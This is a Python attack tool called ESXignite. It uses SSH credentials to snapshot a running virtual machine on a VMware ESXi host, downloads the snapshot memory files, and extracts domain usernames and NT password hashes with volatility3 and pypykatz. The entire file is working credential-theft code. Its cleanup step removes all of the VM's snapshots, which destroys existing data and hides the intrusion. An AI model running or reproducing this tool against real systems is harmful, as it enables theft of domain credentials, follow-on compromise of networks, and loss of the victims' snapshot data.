import time, re, paramiko, string
import random, sys, scp, argparse
import os

def banner():
  print("""
      (        )                                 
      )\ )  ( /(                         )       
 (   (()/(  )\()) (   (  (        (   ( /(   (   
 )\   /(_))((_)\  )\  )\))(  (    )\  )\()) ))\  
((_) (_))  __((_)((_)((_))\  )\ )((_)(_))/ /((_) 
| __|/ __| \ \/ / (_) (()(_)_(_/( (_)| |_ (_))   
| _| \__ \  >  <  | |/ _` || ' \))| ||  _|/ -_)  
|___||___/ /_/\_\ |_|\__, ||_||_| |_| \__|\___|  
                     |___/ 
  """)

def random_string(n):
  return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def waiting(stdout):
  sys.stdout.flush()
  while not stdout.channel.exit_status_ready():
    time.sleep(1)
    sys.stdout.write('.')
    sys.stdout.flush()
  print()

def ssh_connect(hostname, username, password):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  ssh.connect(hostname=hostname, username=username, password=password)
  return ssh

def get_vm_id(ssh, vm_name):
  cmd = f"vim-cmd vmsvc/getallvms|grep {vm_name}"+"|awk '{print $1}'"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  result = ssh_stdout.readlines()
  if len(result) > 1:
    print('[-] Ambiguous name {vm_name}, please verify and retry later')
    exit()
  vm_id = result[0][:-1]
  print(f"[+] found VMID={vm_id}")
  return vm_id

def create_snapshot(ssh, vm_name, vm_id):
  name, desc = random_string(10), random_string(10)
  cmd = f"vim-cmd vmsvc/snapshot.create {vm_id} {name} {desc} 1 0"
  print(f"[+] Creating snapshot for {vm_name} with VMID={vm_id}",end='')
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  waiting(ssh_stdout)

  cmd = f"vim-cmd vmsvc/snapshot.get {vm_id}"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  snapshot_desc = [i for i in ssh_stdout.readlines() if '--Snapshot Id' in i][0]
  snapshot_id = re.search(r'\d{1,}', snapshot_desc)

  if snapshot_id == None:
    print(f"Error finding snapshots associated with the VMID {vm_id}")
    exit()
  snapshot_id = snapshot_id[0]
  print(f'[+] Found SNAPSHOTID {snapshot_id}')
  return snapshot_id

def find_vm_folder(ssh, vm_name):
  print(f"[+] Searching for the folder of the VM {vm_name}")
  cmd = f"find -name '{vm_name}' 2>/dev/null | grep '/vmfs/volumes/'"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  result = ssh_stdout.readlines()
  if len(result) > 1:
    print('[-] Ambiguous name {vm_name}, please verify and retry later')
    exit()
  vm_folder = result[0][:-1]
  print(f"[+] Found the folder of the VM {vm_name} : {vm_folder}")
  return vm_folder

def find_vm_snapshot(ssh, vm_folder, snapshot_id):
  print(f"[+] Searching for the .vmem and .vmsn files of the snapshot {snapshot_id}")

  cmd = f"find '{vm_folder}' -name '{vm_name}-Snapshot{snapshot_id}.vmem' 2>/dev/null"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  result = ssh_stdout.readlines()
  if len(result) > 1:
    print('[-] .vmem could not be found... Please verify and retry later')
    exit()
  vmem = result[0][:-1]
  vmemshort = vmem.split('/')[-1]
  print(f"[+] Found the .vmem file of the snapshot {snapshot_id} : {vmemshort}")

  cmd = f"find '{vm_folder}' -name '{vm_name}-Snapshot{snapshot_id}.vmsn' 2>/dev/null"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  result = ssh_stdout.readlines()
  if len(result) > 1:
    print('[-] .vmsn file could not be found... Please verify and retry later')
    exit()
  vmsn = result[0][:-1]
  vmsnshort = vmsn.split('/')[-1]
  print(f"[+] Found the .vmem file of the snapshot {snapshot_id} : {vmsnshort}")

  return (vmem, vmsn)

def clean_snapshot(ssh, vm_name, vm_id, snapshot_id):
  print(f"[+] Removing the snapshot {snapshot_id} of the VM : {vm_name} (VMID: {vm_id})",end='')
  cmd = f"vim-cmd vmsvc/snapshot.removeall {vm_id}"
  _, ssh_stdout, _ = ssh.exec_command(cmd)
  waiting(ssh_stdout)
  print(f"[+] Snapshot {snapshot_id} erased")

def get_file(ssh, file):
  print(f'[+] Downloading file : {file}')
  fileshort = file.split('/')[-1]
  with scp.SCPClient(ssh.get_transport()) as client:
    client.get(file)
  print(f'[+] Memory dump successfully written at : ./{fileshort} !')

def volatility_parse(output):
  for line in output:
    if re.search("kerberos|dpapi|Font Driver Host|Window Manager", line) == None:
      account = line.split()
      if len(account) == 5:
        domain, username, nt = account[1], account[2], account[3]
        print(f'[*] {domain}\\{username}:{nt}')

if __name__ == '__main__':
  if len(sys.argv) < 5: banner()
  parser = argparse.ArgumentParser(
    description="Create+extract the RAM of a running VM on an ESXi and extract it's secrets",
    usage='ESXignite.py [-h] -t hostname -u user -p password -v vm_name'
  )
  parser.add_argument("--target", "-t", action="store", dest="hostname", required=True, help="ESXi hostname/IP")
  parser.add_argument("--username", "-u", action="store", dest="username", required=True, help="Username for ESXi SSH authication")
  parser.add_argument("--password", "-p", action="store", dest="password", required=True, help="Password for ESXi SSH authentication")
  parser.add_argument("--virtual-machine", "-v", action="store", dest="vm_name", required=True, help="Virtual Machine name to dump secrets from")
  args = parser.parse_args()

  vm_name = args.vm_name

  ssh = ssh_connect(args.hostname, args.username, args.password)

  vm_id = get_vm_id(ssh, vm_name)
  snapshot_id = create_snapshot(ssh, vm_name, vm_id)
  folder = find_vm_folder(ssh, vm_name)
  vmem_file, vmsn_file = find_vm_snapshot(ssh, folder, snapshot_id)
  get_file(ssh, vmem_file)
  get_file(ssh, vmsn_file)
  clean_snapshot(ssh, vm_name, vm_id, snapshot_id)

  vmemshort = vmem_file.split('/')[-1]
  print('[+] Dumping Secrets...')

  output = os.popen(f'python3 ./volatility3/vol.py -f ./{vmemshort} -p ./pypykatz-volatility3 pypykatz 2>/dev/null').readlines()
  volatility_parse(output)
